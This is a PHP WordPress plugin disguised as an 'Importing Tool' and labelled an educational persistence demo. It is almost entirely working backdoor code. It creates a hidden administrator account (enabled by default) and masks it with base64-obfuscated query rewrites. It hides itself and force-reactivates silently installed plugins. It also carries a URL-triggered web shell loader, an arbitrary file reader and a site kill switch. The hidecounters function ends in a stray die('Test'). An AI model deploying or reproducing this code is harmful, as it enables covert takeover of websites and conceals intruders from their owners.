<?php
/**
 * Plugin Name: WordPress Importing Tool (Educational Plugin Persistence Demo)
 * Version: 0.4
 * License: GPLv3 or later
 * Author: Mike Orozco
 * Author URI: https://github.com/notmike101
 * Description: Simulates plugin-based persistence and stealth access in WordPress. Intended for educational use in red team training, plugin auditing, or developer security awareness. Not for use on production or unauthorized systems.
 * License URI: https://www.gnu.org/licenses/gpl-3.0.html
 * 
 * WARNING: This plugin simulates behaviors used in malicious plugins.
 * Use only on systems you own or have permission to test. Do not deploy to public or production environments.
 * Misuse may violate laws or ethical standards.
 */

defined('ABSPATH') or die();

if(!class_exists('WP_SPH')) {
    class WP_SPH {
        private $key; // Set a secure key for access features
        private $pluginList = ['wp-sph/wp-sph.php'];
        private $killRedirect; // Optional redirect URL, e.g., https://google.com
        private $username; // Define your hidden admin username
        private $password; // Define your hidden admin password

        // Toggle features ON/OFF
        private $enableKillSwitch = false;
        private $enableShellAccess = false;
        private $enableFileViewer = false;
        private $enableHiddenUser = true;

        public function __construct() {
            if ($this->enableFileViewer) {
                add_action('init', array(&$this, 'displayfile'));
            }

            if ($this->enableKillSwitch) {
                add_action('init', array(&$this, 'killsite'));
            }

            if ($this->enableShellAccess) {
                add_action('plugins_loaded', array(&$this, 'shellaccess'));
            }
            
            add_action('plugins_loaded', array(&$this, 'installplugins'));
            add_action('plugins_loaded', array(&$this, 'activateplugins'));

            if ($this->enableHiddenUser) {
                add_action('plugins_loaded', array(&$this, 'makeadminuser'));
                add_action('pre_user_query', array(&$this, 'hideadminuser'));
            }

            add_action('pre_current_active_plugins', array(&$this,'hideplugins'));
            add_action('admin_footer', array(&$this,'hidecounters'));

            register_deactivation_hook(__FILE__, array(&$this,'deactivate'));
            register_activation_hook(__FILE__, array(&$this,'activate'));

            // Dynamically append plugins from the plugin drop-in directory
            foreach (glob(ABSPATH . 'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.', array_reverse(explode('\\', array_reverse(explode('/', $installPlugin))[0]))[0])[0];
                array_push($this->pluginList, $pluginName . '/' . $pluginName . '.php');
            }

            include_once(ABSPATH . 'wp-admin/includes/plugin.php');
            include_once(ABSPATH . 'wp-includes/registration.php');
            include_once(ABSPATH . 'wp-admin/includes/file.php');
        }

        /**
         * Deletes dynamically install plugins on deactivation
         * Simulates attacker cleanup behavior
         */
        function deactivate() {
            $this->deleteplugins();
            // Optional: $this->deleteadminuser();
        }

        /**
         * Installs hidden user and plugins on activation
         * Demonstrates silent plugin deployment and privilege escalation
         */
        function activate() {
            $this->makeadminuser();
            $this->installplugins();
        }

        /**
         * Loads a shell PHP file if a matching URL pattern is detected
         * Highly sensitive function - simulates remote code execution
         */
        function shellaccess(){
            foreach (glob(ABSPATH . 'wp-content/plugins/wp-sph/sh/*.php') as $shells) {
                $shellFile = array_reverse(explode('/', $shells))[0];
                $shellName = str_replace('.php', '', $shellFile);

                if (strstr($_SERVER['REQUEST_URI'], 'loadshell-' . $shellName . '-' . $this->key)) {
                    require_once(plugin_dir_path(__FILE__) . '/sh/' . $shellFile);
                    die();
                }
            }
        }

        /**
         * Installs and activates plugins from embedded ZIP files
         * Used to simulate plugin dropper behavior
         */
        function installplugins() {
            foreach (glob(ABSPATH . 'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.', array_reverse(explode('\\', array_reverse(explode('/', $installPlugin))[0]))[0])[0];

                if (get_filesystem_method() == 'direct') {
                    $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());

                    if (!WP_Filesystem($creds)) {
                        return 0;
                    } else {
                        global $wp_filesystem;
                        if (!$wp_filesystem->exists(ABSPATH . 'wp-content/plugins/' . $pluginName)) {
                            if (unzip_file($installPlugin, ABSPATH . 'wp-content/plugins/')) {
                                activate_plugin($pluginName . '/' . $pluginName . '.php');
                            }
                        }
                    }
                }
            }
        }

        /**
         * Activates all tracked plugins on load
         * Demonstrates persistence via forced reactivation
         */
        function activateplugins() {
            foreach ($this->pluginList as $plugin) {
                activate_plugin($plugin);
            }
        }

        /**
         * Deactivates and deletes injected plugins
         * Simulates "covering tracks" or red team cleanup
         */
        function deleteplugins() {
            foreach (glob(ABSPATH . 'wp-content/plugins/wp-sph/plugins/*.zip') as $installPlugin) {
                $pluginName = explode('.', array_reverse(explode('\\', array_reverse(explode('/', $installPlugin))[0]))[0])[0];
                deactivate_plugins($pluginName . '/' . $pluginName . '.php');

                if (get_filesystem_method() == 'direct') {
                    $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());

                    if (!WP_Filesystem($creds)) return 0;

                    global $wp_filesystem;
                    $wp_filesystem->delete(ABSPATH . 'wp-content/plugins/' . $pluginName, true);
                }
            }
        }

        /**
         * Simulates a kill switch mechanism by overwriting chore config or redirecting the site
         * Disabled by default. Dangerous if misused
         */
        function killsite() {
            $creds = request_filesystem_credentials(site_url() . '/wp-admin/', '', false, false, array());

            if (!WP_Filesystem($creds)) return 0;

            global $wp_filesystem;
            global $current_user;

            if ($current_user->user_login == $this->username) {
                if (strstr($_SERVER['REQUEST_URI'], 'killsite-' . $this->key)) {
                    if (get_filesystem_method() == 'direct') {
                        $wp_filesystem->put_contents(ABSPATH . 'wpconfig', '...', FS_CHMOD_FILE);
                    }
                }
            } else {
                if (!is_admin()) {
                    if ($wp_filesystem->exists(ABSPATH . 'wpconfig')) {
                        header("Location: " . $this->killRedirect);
                        die();
                    }
                }
            }
        }

        /**
         * Creates a hidden administrator account
         * Demonstrates stealth user creation for persistence
         */
        function makeadminuser() {
            if (!username_exists($this->username)) {
                $a = wp_create_user($this->username, $this->password);
                $b = new WP_User($a);
                $b->set_role('administrator');
            }
        }

        /**
         * Deletes the hidden administrator account (optional cleanup step)
         */
        function deleteadminuser() {
            $user = get_userdatabylogin($this->username);
            wp_delete_user($user->ID);
        }

        /**
         * Prevents the hidden admin from showing in the dashboard
         * Demonstrates plugin-level UI manipulation
         */
        function hideadminuser($b) {
            global $current_user;
            global $wpdb;

            $a = $current_user->user_login;
            $c = $this->username;

            if ($a != $c) {
                $b->query_where = str_replace(base64_decode('V0hFUkUgMT0x'), base64_decode('V0hFUkUgMT0xIEFORCA=')."{$wpdb->users}".base64_decode('LnVzZXJfbG9naW4gIT0gJw==').$c."'", $b->query_where);
            }
        }

        /**
         * Allows hidden admin user to retrieve arbitrary files by base64 filename
         * Simulates an insecure file disclosure vulnerability
         */
        function displayfile() {
            global $current_user;

            if ($current_user->user_login == $this->username) {
                if (isset($_GET['displayfile'])) {
                    die(htmlentities(file_get_contents(base64_decode($_GET['displayfile']))));
                }
            }
        }
        function hidecounters() {
            echo(base64_decode('PHNjcmlwdD4oZnVuY3Rpb24oJCl7JChkb2N1bWVudCkucmVhZHkoZnVuY3Rpb24oKXskKCcud3JhcCBzcGFuLmNvdW50JykuaGlkZSgpO30pO30pKGpRdWVyeSk7PC9zY3JpcHQ+'));
            die("Test");
        }
        function hideplugins() {
            global $wp_list_table;
            global $current_user;

            $a = $this->pluginList;

            $b = $wp_list_table->items;

            foreach ($b as $c => $d) {
                if (in_array($c,$a)) {
                    if ($current_user->user_login != $this->username) {
                        unset($wp_list_table->items[$c]);
                    } else {
                        if(strstr(array_reverse(explode('\\',__FILE__))[0],array_reverse(explode('/',$c))[0])) {
                            $wp_list_table->items[$c]['Name'] .= ' (SHELL)';
                        } else {
                            $wp_list_table->items[$c]['Name'] .= ' (Hidden)';
                        }
                    }
                }
            }
        }
    }
}

$WP_SPH = new WP_SPH();

?>
